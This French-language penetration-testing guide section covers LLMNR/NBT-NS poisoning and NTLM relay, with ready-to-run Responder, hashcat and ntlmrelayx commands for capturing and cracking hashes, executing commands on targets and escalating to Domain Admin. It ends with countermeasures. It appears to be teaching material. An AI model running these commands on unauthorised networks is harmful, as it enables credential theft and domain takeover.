# III.D. Relais NTLM et Empoisonnement LLMNR/NBT-NS

Ces techniques exploitent les protocoles de résolution de noms hérités (LLMNR, NBT-NS) et le mécanisme d'authentification NTLM pour intercepter des hashes ou relayer des authentifications.

## 1. Empoisonnement LLMNR/NBT-NS et Capture de Hashes Net-NTLM

*   **Principe :**
    1.  Lorsqu'un client ne parvient pas à résoudre un nom via DNS, il peut utiliser LLMNR (Link-Local Multicast Name Resolution) ou NBT-NS (NetBIOS Name Service) en dernier recours.
    2.  Un attaquant sur le même segment réseau peut répondre à ces requêtes en se faisant passer pour la ressource demandée.
    3.  Le client envoie alors ses informations d'authentification (hash Net-NTLMv1/v2) à l'attaquant.
*   **Outils :**
    *   **Responder (Linux) :**
        ```bash
        # Lancer Responder sur une interface spécifique
        sudo responder -I <interface_reseau> -wfv
        # -w: Démarrer le serveur WPAD malveillant (peut aider à obtenir plus de hashes)
        # -f: Permettre l'empreinte digitale du système d'exploitation distant
        # -v: Mode verbeux
        # Les hashes capturés sont stockés dans le répertoire logs/ (ex: SMB-NTLMv2-SSP-<IP>.txt)
        ```
*   **Craquage des Hashes Net-NTLM :**
    *   **Net-NTLMv1 (mode Hashcat 5500) :** Plus faible, plus facile à craquer.
    *   **Net-NTLMv2 (mode Hashcat 5600) :** Plus fort, nécessite de bons dictionnaires ou des attaques par règles.
    ```bash
    # Craquer avec Hashcat
    hashcat -m 5600 hashes_netntlmv2.txt rockyou.txt
    ```

## 2. Relais NTLM

*   **Principe :** Au lieu de simplement capturer et craquer le hash, l'attaquant relaie l'authentification NTLM entrante vers une autre machine (la cible du relais). Si l'authentification réussit sur la machine cible, l'attaquant obtient une session ou peut exécuter des actions au nom de l'utilisateur relayé.
*   **Conditions :**
    *   La signature SMB (SMB Signing) doit être désactivée ou non requise sur la machine cible du relais.
    *   L'utilisateur dont l'authentification est relayée doit avoir des droits sur la machine cible.
*   **Outils :**
    *   **Impacket `ntlmrelayx.py` (Linux) :**
        ```bash
        # Préparer une liste de cibles pour le relais (targets.txt, une IP par ligne)
        # Exemple: Relais SMB vers une liste de cibles, exécution d'une commande
        sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
        # -smb2support: Active le support SMBv2/3

        # Relais SMB interactif (psexec-like)
        sudo ntlmrelayx.py -tf targets.txt -smb2support -i

        # Relais vers LDAP/S (potentiellement très puissant)
        # --dump-gmsa, --delegate-access (RBCD), --add-computer, --add-delegate, etc.
        sudo ntlmrelayx.py -t ldaps://<IP_DC> --delegate-access # Tente de créer un compte machine et de configurer RBCD
        sudo ntlmrelayx.py -t ldaps://<IP_DC> --add-computer NEWCOMP$ --add-computer-pass 'Password123!'
        sudo ntlmrelayx.py -t ldaps://<IP_DC> --escalate-user <USER_A_ESCALADER_EN_DA> # Nécessite des droits pour modifier le groupe DA

        # Combiner avec Responder (Responder écoute, ntlmrelayx relaie)
        # 1. Modifier responder.conf: SMB = Off, HTTP = Off (pour que ntlmrelayx gère ces protocoles)
        # 2. Lancer Responder: sudo responder -I <interface> -v
        # 3. Lancer ntlmrelayx: sudo ntlmrelayx.py -tf targets.txt -smb2support (-c "commande" ou autre action)
        ```
*   **Metasploit (modules de relais) :**
    *   `auxiliary/server/capture/smb` (pour capturer)
    *   `exploit/windows/smb/smb_relay` (pour relayer, plus ancien)
    *   Des modules plus récents peuvent exister.

## Considérations et Contre-mesures
*   **Signature SMB (SMB Signing) :** Activer sur tous les clients et serveurs pour empêcher le relais SMB.
*   **Protection LDAP (LDAP Signing & Channel Binding) :** Empêche le relais vers LDAP.
*   **Désactiver LLMNR et NBT-NS :** Via GPO.
*   **Segmentation réseau :** Limite la portée de l'empoisonnement.
*   **EPA (Extended Protection for Authentication) :** Aide à se prémunir contre le relais.
*   **Principe de moindre privilège :** Les utilisateurs relayés ne devraient pas avoir de droits excessifs sur les machines cibles. 